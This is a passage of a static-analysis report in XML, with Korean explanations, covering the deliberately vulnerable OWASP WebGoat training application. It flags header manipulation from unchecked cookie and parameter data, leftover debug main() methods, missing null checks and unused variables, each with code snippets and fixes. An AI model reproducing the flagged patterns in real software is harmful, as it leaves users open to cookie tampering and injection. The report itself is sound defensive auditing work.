<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpOnly.java</FilePath>
<LineStart>198</LineStart>
<Snippet>			original = value;
		} else {
			response.setHeader("Set-Cookie", UNIQUE2U + "=" + cookie + "; HttpOnly");
			original = cookie;
		}</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.setHeader()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>621</LineStart>
<Snippet>	public String getCookie( String cookieName )
	{
		Cookie[] cookies = getRequest().getCookies();

		for ( int i = 0; i &lt; cookies.length; i++ )</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getCookies()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="78CC3806E9D1F088CF646687436440EE" ruleID="66D0CC4C-1D62-436E-9332-8F3073B0558A">
                            <Category>Header Manipulation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HammerHead.java의 writeScreen() 메서드는 535 줄의 HTTP 응답 헤더에 확인되지 않은 데이터를 포함합니다. 이는 캐시 감염(cache-poisoning), cross-site scripting, 교차 사용자 변조(cross-user defacement), 페이지 하이재킹(page hijacking), 쿠키 조작 또는 open redirection과 같은 공격을 유발합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>535</LineStart>
<Snippet>	// Trying to avoid chunked-encoding. (Aspect required)
	response.setContentLength(s.getContentLength());
	response.setHeader("Content-Length", s.getContentLength() + "");

	s.output(out);</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.setHeader()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="158A50159AE2990EEF2E628C38044FF7" ruleID="66D0CC4C-1D62-436E-9332-8F3073B0558A">
                            <Category>Header Manipulation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HammerHead.java의 writeScreen() 메서드는 535 줄의 HTTP 응답 헤더에 확인되지 않은 데이터를 포함합니다. 이는 캐시 감염(cache-poisoning), cross-site scripting, 교차 사용자 변조(cross-user defacement), 페이지 하이재킹(page hijacking), 쿠키 조작 또는 open redirection과 같은 공격을 유발합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>535</LineStart>
<Snippet>	// Trying to avoid chunked-encoding. (Aspect required)
	response.setContentLength(s.getContentLength());
	response.setHeader("Content-Length", s.getContentLength() + "");

	s.output(out);</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.setHeader()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2957B5B069CB47161A6FBA398311B2A1" ruleID="790A125E-5BFE-4931-A51A-29B7D5BECC93">
                            <Category>Header Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HttpOnly.java의 removeHttpOnly() 메서드는 212 줄의 HTTP 응답 헤더에 확인되지 않은 데이터를 포함합니다. 이는 캐시 감염(cache-poisoning), cross-site scripting, 교차 사용자 변조(cross-user defacement), 페이지 하이재킹(page hijacking), 쿠키 조작 또는 open redirection과 같은 공격을 유발합니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>HttpOnly.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpOnly.java</FilePath>
<LineStart>212</LineStart>
<Snippet>			original = value;
		} else {
			response.setHeader("Set-Cookie", UNIQUE2U + "=" + cookie + ";");
			original = cookie;
		}</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.setHeader()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>621</LineStart>
<Snippet>	public String getCookie( String cookieName )
	{
		Cookie[] cookies = getRequest().getCookies();

		for ( int i = 0; i &lt; cookies.length; i++ )</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getCookies()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>J2EE Bad Practices: Leftover Debug Code</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Encoding 클래스에는 디버그 코드가 포함되어 있어서 배포된 웹 응용 프로그램에 예기치 않은 진입점을 만들 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>일반적인 개발 방법은 응용 프로그램으로 발표하거나 배포하지는 않고 디버깅 및 테스트 목적으로만 특별 디자인된 "비밀" 코드를 추가하는 것입니다. 이 비밀 디버그 코드가 실수로 응용 프로그램에 남아 있게 되면 응용 프로그램은 예기치 않은 상호 작용 모드에 노출됩니다. 이 비밀 진입점은 디자인이나 테스트 도중 고려되지 않고 응용 프로그램의 예상 동작 조건 범위를 벗어나기 때문에 보안 위험을 야기합니다.

실수로 남겨둔 디버그 코드의 가장 일반적인 예는 main() 메서드가 웹 응용 프로그램에 나타나는 것입니다. 이는 제품 개발에서는 허용되는 방식이지만 J2EE 운영 응용 프로그램에 속한 클래스는 main()을 정의할 수 없습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>응용 프로그램의 운영 버전을 배포하기 전에 디버그 코드를 제거해야 합니다. 직접적인 보안 위협의 증명 여부에 관계없이 초기 개발 단계 이후에 응용 프로그램에 디버그 코드가 남아 있을 이유가 없습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. main() 메서드의 존재는 빙산의 일각일 수 있습니다. main()를 발견하면 개발자가 서둘렀거나 정상적으로 작업을 끝내지 못했음을 나타내는 다른 증거도 찾아 보십시오.

2. J2EE가 아닌 Java 응용 프로그램을 감사하는 경우 J2EE의 부적절한 사례 범주가 사용자 환경에 적용되지 않을 수 있습니다. 이런 경우 Audit Guide를 사용하여 이러한 문제를 억제할 수 있습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>4</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="47D0E56CF6C0BE005EB528F440C796D2" ruleID="625EEE1F-464F-42DC-85D6-269A637EF747">
                            <Category>J2EE Bad Practices: Leftover Debug Code</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Encoding 클래스에는 디버그 코드가 포함되어 있어서 배포된 웹 응용 프로그램에 예기치 않은 진입점을 만들 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>739</LineStart>
<Snippet>	 * @param  args  The command line arguments
	 */

	public static void main( String[] args )
	{</Snippet>
<TargetFunction>Function: main()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="39935F5497EC906A3A07B9EA4DB66A0C" ruleID="625EEE1F-464F-42DC-85D6-269A637EF747">
                            <Category>J2EE Bad Practices: Leftover Debug Code</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec 클래스에는 디버그 코드가 포함되어 있어서 배포된 웹 응용 프로그램에 예기치 않은 진입점을 만들 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>502</LineStart>
<Snippet>     * @param  args  The command line arguments
     */
    public static void main(String[] args)
    {
	ExecResults results;</Snippet>
<TargetFunction>Function: main()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6DE0722B567CE1995B714A6C99B27D45" ruleID="625EEE1F-464F-42DC-85D6-269A637EF747">
                            <Category>J2EE Bad Practices: Leftover Debug Code</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WebgoatProperties 클래스에는 디버그 코드가 포함되어 있어서 배포된 웹 응용 프로그램에 예기치 않은 진입점을 만들 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebgoatProperties.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebgoatProperties.java</FilePath>
<LineStart>112</LineStart>
<Snippet>

    public static void main(String[] args)
    {
	WebgoatProperties properties = null;</Snippet>
<TargetFunction>Function: main()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4C617F5E1017A5616DA20C1873DA1A59" ruleID="625EEE1F-464F-42DC-85D6-269A637EF747">
                            <Category>J2EE Bad Practices: Leftover Debug Code</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CreateDB 클래스에는 디버그 코드가 포함되어 있어서 배포된 웹 응용 프로그램에 예기치 않은 진입점을 만들 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>50</LineStart>
<Snippet>     * @param args The command line arguments
     */
    public static void main(String[] args)
    {
</Snippet>
<TargetFunction>Function: main()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Missing Check against Null</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Challenge2Screen.java의 getNetstatResults() 메서드는 getProperty()의 반환 값을 확인하지 않아 646 줄의 null 포인터를 역참조할 수 있으므로 null을 반환할 수도 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>소프트웨어에 대한 대부분의 심각한 공격은 프로그래머의 가정 위반에서 비롯됩니다. 공격 후, 프로그래머의 가정은 취약하고 근거가 빈약해 보이지만 공격 전에는 많은 프로그래머가 열심히 자신의 가정을 옹호하게 마련입니다.

코드에서 흔히 발견되는 두 가지 의심스런 가정은 "이 함수 호출은 절대 실패하지 않는다" 및 "이 함수 호출이 실패해도 상관 없다"입니다. 프로그래머가 함수의 반환 값을 무시하는 경우 암시적으로 이 가정 중 하나에 따라 동작하는 것으로 볼 수 있습니다.



예제 1:  다음 코드는 멤버 함수 compareTo()를 호출하기 전에 getParameter()가 반환한 문자열이 null인지 검사하지 않기 때문에 null dereference가 발생할 수 있습니다.


String itemName = request.getParameter(ITEM_NAME);
	if (itemName.compareTo(IMPORTANT_ITEM)) {
		...
	}
	...


예제 2: 다음 코드는 null로 설정되면 해당 속성이 항상 정의된다는 잘못된 가정을 하는 프로그래머가 역참조하는 시스템 속성을 보여줍니다.


System.clearProperty("os.name");
...
String os = System.getProperty("os.name");
if (os.equalsIgnoreCase("Windows 95") )
	System.out.println("Not supported");


이 코딩 오류에 대한 전형적인 변명은 이렇습니다. 

“요청한 값이 항상 존재한다는 것을 알고 있습니다. 왜냐하면... 값이 존재하지 않는 경우, 프로그램이 필요한 동작을 수행할 수 없기 때문에 오류 처리 여부가 중요하지 않거나 프로그램이 null 값을 역참조하다가 중지해도 상관 없습니다.”

하지만 공격자는 프로그램에서 예기치 못한 경로를 찾아내는 데 능숙하며 예외와 관련이 있는 경우가 대표적인 예입니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>함수가 오류 코드를 반환하거나 다른 성공 또는 실패의 증거를 반환하는 경우, 오류가 발생하는 확실한 방법이 없는 경우에도 항상 오류 조건을 검사하십시오. 보안 오류를 예방하는 것도 중요하지만 초기에 의심스러운 수많은 버그가 결국 unchecked return value와 함께 메소드 호출 실패로 이어집니다.

응용 프로그램에서 실패를 해결하기 위해 사용하기 쉬운 표준 방법을 만드십시오. 오류 처리가 단순명료하다면 프로그래머가 오류 처리를 생략하지 않을 것입니다. 오류 처리를 표준화하는 한 가지 접근 방식은 자주 사용하는 함수 주위에 추가 프로그래머 개입 없이 오류 조건을 검사하고 처리하는 래퍼를 작성하는 것입니다. 래퍼를 구현하여 적용하면 사용자 지정 규칙을 사용하여 래퍼 없는 함수를 사용하는 것을 금지하고 강제할 수 있습니다. 

예제 3: 다음 코드는 getParameter()의 반환 값이 null이 아닌지 검사하고 요청한 매개 변수가 정의되어 있지 않은 경우 기본값을 사용하는 래퍼를 getParameter() 속성 주위에 구현합니다.


String safeGetParameter (HttpRequest request, String name)
{
    String value = request.getParameter(name);
    if (value == null) {
        return getDefaultValue(name)
    }
    return value;
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. "그런 일은 절대 일어날 수 없습니다. 왜냐하면..."이라고 말하면서 이 이슈를 덮어두려는 프로그래머를 조심하십시오. 이들은 개발 워크스테이션을 사용하여 시스템 동작 방식에 대한 직관력을 키웠을 가능성이 큽니다. 소프트웨어를 다른 운영 체제, 다른 운영 체제 버전, 다른 하드웨어 구성 또는 다른 런타임 환경에서 실행하게 되면 이들의 직관력은 무용지물이 될 수 있습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>4</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="DA66D0FAB27C3D7E59E285E24796B78B" ruleID="4280F38B-9FDB-454E-B495-89CF45CD51B7">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>WSDLScanning.java의 createContent() 메서드는 getParameterValues()의 반환 값을 확인하지 않아 217 줄의 null 포인터를 역참조할 수 있으므로 null을 반환할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>201</LineStart>
<Snippet>	try
	{
	    String[] fields = s.getParser().getParameterValues("field");
	    int id = s.getParser().getIntParameter("id");
	    if (connection == null)</Snippet>
<TargetFunction>fields = getParameterValues(...) : ParameterParser.getParameterValues may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="ACDE20A434A7B822AF9A8A04B1FCAB10" ruleID="C3693353-E32E-4B40-964A-94186E0D63B3">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>Challenge2Screen.java의 getNetstatResults() 메서드는 getProperty()의 반환 값을 확인하지 않아 646 줄의 null 포인터를 역참조할 수 있으므로 null을 반환할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>644</LineStart>
<Snippet>	String protocol = s.getParser().getRawParameter(PROTOCOL, "tcp");

	String osName = System.getProperty("os.name");
	ExecResults er = null;
	if (osName.indexOf("Windows") != -1)</Snippet>
<TargetFunction>osName = getProperty(?) : System.getProperty may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C183732E31D7FFCBFC8E6D6F50331C35" ruleID="4280F38B-9FDB-454E-B495-89CF45CD51B7">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>ParameterParser.java의 toString() 메서드는 getParameterValues()의 반환 값을 확인하지 않아 1072 줄의 null 포인터를 역참조할 수 있으므로 null을 반환할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>1072</LineStart>
<Snippet>	{
	    String key = (String) e.nextElement();
	    s.append(key + "=" + getParameterValues(key)[0]);

	    // FIXME: Other values?</Snippet>
<TargetFunction>getParameterValues(...) : ParameterParser.getParameterValues may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="518797903AE242F8EC4C9B414CE99CD2" ruleID="4280F38B-9FDB-454E-B495-89CF45CD51B7">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>HttpOnly.java의 handleReadAction() 메서드는 getParameter()의 반환 값을 확인하지 않아 302 줄의 null 포인터를 역참조할 수 있으므로 null을 반환할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HttpOnly.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpOnly.java</FilePath>
<LineStart>299</LineStart>
<Snippet>	private void handleReadAction(WebSession s) {
		
		String displayed = s.getRequest().getParameter(READ_RESULT);
		
		if(httpOnly == true) {</Snippet>
<TargetFunction>displayed = getParameter(...) : ServletRequest.getParameter may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Poor Style: Redundant Initialization</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>ReflectedXSS.java의 createContent() 메서드는 77 줄의 quantity 변수에 할당된 초기 값을 사용하지 않습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>이 변수의 초기 값은 사용되지 않습니다. 초기화되고 나면 변수에 다른 값이 할당되거나 범위를 벗어납니다.

예제: 다음의 발췌된 코드는 변수 r에 할당된 후 변수를 사용하지 않고 값을 덮어씁니다.


  int r = getNum();
  r = getNewNum(buf);
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>코드를 보다 쉽게 이해하고 유지하려면 불필요한 할당을 제거하십시오.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>4</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="19225B5C67375D96F7D4C4E2C9E273ED" ruleID="A984452A-DD31-47C9-83A6-76F5EA13133F">
                            <Category>Poor Style: Redundant Initialization</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>ReflectedXSS.java의 createContent() 메서드는 78 줄의 total 변수에 할당된 초기 값을 사용하지 않습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ReflectedXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ReflectedXSS.java</FilePath>
<LineStart>78</LineStart>
<Snippet>		    "field2", "4128 3214 0002 1999"));
	    float quantity = 1.0f;
	    float total = 0.0f;
	    float runningTotal = 0.0f;
</Snippet>
<TargetFunction>VariableAccess: total</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FF1207EB0E32FB47AE0B6A2DD090D7A8" ruleID="A984452A-DD31-47C9-83A6-76F5EA13133F">
                            <Category>Poor Style: Redundant Initialization</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>ReflectedXSS.java의 createContent() 메서드는 77 줄의 quantity 변수에 할당된 초기 값을 사용하지 않습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ReflectedXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ReflectedXSS.java</FilePath>
<LineStart>77</LineStart>
<Snippet>	    String param2 = HtmlEncoder.encode(s.getParser().getRawParameter(
		    "field2", "4128 3214 0002 1999"));
	    float quantity = 1.0f;
	    float total = 0.0f;
	    float runningTotal = 0.0f;</Snippet>
<TargetFunction>VariableAccess: quantity</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4118B2A42B08129A735C2E31A9B7F96A" ruleID="A984452A-DD31-47C9-83A6-76F5EA13133F">
                            <Category>Poor Style: Redundant Initialization</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>TraceXSS.java의 createContent() 메서드는 78 줄의 total 변수에 할당된 초기 값을 사용하지 않습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>TraceXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/TraceXSS.java</FilePath>
<LineStart>78</LineStart>
<Snippet>		    "field2", "4128 3214 0002 1999"));
	    float quantity = 1.0f;
	    float total = 0.0f;
	    float runningTotal = 0.0f;
</Snippet>
<TargetFunction>VariableAccess: total</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F8C627B24DCDDD52DABCB52D9DFA549B" ruleID="A984452A-DD31-47C9-83A6-76F5EA13133F">
                            <Category>Poor Style: Redundant Initialization</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>TraceXSS.java의 createContent() 메서드는 77 줄의 quantity 변수에 할당된 초기 값을 사용하지 않습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>TraceXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/TraceXSS.java</FilePath>
<LineStart>77</LineStart>
<Snippet>	    String param2 = HtmlEncoder.encode(s.getParser().getRawParameter(
		    "field2", "4128 3214 0002 1999"));
	    float quantity = 1.0f;
	    float total = 0.0f;
	    float runningTotal = 0.0f;</Snippet>
<TargetFunction>VariableAccess: quantity</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Poor Style: Value Never Read</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>CommandInjection.java의 createContent() 메서드는 134 줄의 safeDirName 변수에 할당된 값을 사용하지 않습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>이 변수의 값은 사용되지 않습니다. 지정되고 나면 변수에 다른 값이 할당되거나 범위를 벗어납니다.

예제: 다음의 발췌된 코드는 변수 r에 할당된 후 변수를 사용하지 않고 값을 덮어씁니다.


  r = getName();
  r = getNewBuffer(buf);
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>코드를 보다 쉽게 이해하고 유지하려면 불필요한 할당을 제거하십시오.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>4</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="9D3A0C6D941E4174742B122658EFFFAC" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CommandInjection.java의 createContent() 메서드는 134 줄의 safeDirName 변수에 할당된 값을 사용하지 않습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>134</LineStart>
<Snippet>		    {
			// FIXME: This value isn't used.  What is the goal here?
			safeDirName = s.getContext().getRealPath("/")
				+ helpFile;
			illegalCommand = false;</Snippet>
<TargetFunction>VariableAccess: safeDirName</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3589513556962CA5B7033D627DFC6F69" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>UpdateProfile.java의 changeEmployeeProfile() 메서드는 176 줄의 answer_results 변수에 할당된 값을 사용하지 않습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>176</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>VariableAccess: answer_results</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="71FBEAAC863905D25E0B749F71EC1625" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>UpdateProfile.java의 changeEmployeeProfile_BACKUP() 메서드는 225 줄의 answer_results 변수에 할당된 값을 사용하지 않습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>225</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>VariableAccess: answer_results</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="07F7DA7F90EDF740177EC49092EF53A0" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>FindProfile.java의 foundEmployee() 메서드는 114 줄의 id 변수에 할당된 값을 사용하지 않습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/FindProfile.java</FilePath>
<LineStart>114</LineStart>
<Snippet>	try
	{
	    int id = getIntRequestAttribute(s, getLessonName() + "."
		    + RoleBasedAccessControl.EMPLOYEE_ID);
	    found = true;</Snippet>
